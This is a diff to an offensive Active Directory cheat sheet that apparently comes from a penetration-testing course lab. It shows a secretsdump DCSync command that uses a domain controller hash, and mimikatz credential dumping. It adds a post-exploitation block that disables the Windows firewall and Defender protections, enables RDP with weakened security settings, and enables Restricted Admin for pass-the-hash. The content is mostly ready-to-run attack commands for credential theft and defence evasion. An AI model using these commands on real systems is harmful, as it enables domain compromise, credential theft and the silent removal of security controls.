@@ -221,7 +221,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-
 
 Use Domain Controller hash to DCSync
 ```
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+secretsdump.py -just-dc-user <domain>/<username> "ACADEMY-EA-DC01$"@<target.ip> -hashes :313b6f423cd1ee07e91315b4hash
 ```
 
 mimikatz
@@ -233,4 +233,19 @@ sekurlsa::logonpasswords
 find domain name
 ```
 systeminfo | findstr /B "Domain"
+```
+
+Post exploitation
+```
+run -Executable netsh -Arguments advfirewall set allprofiles state off
+
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+
+powershell Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+
+powershell Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+powershell reg add "HKLM\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v SecurityLayer /d 0x0 /f
+
+powershell reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
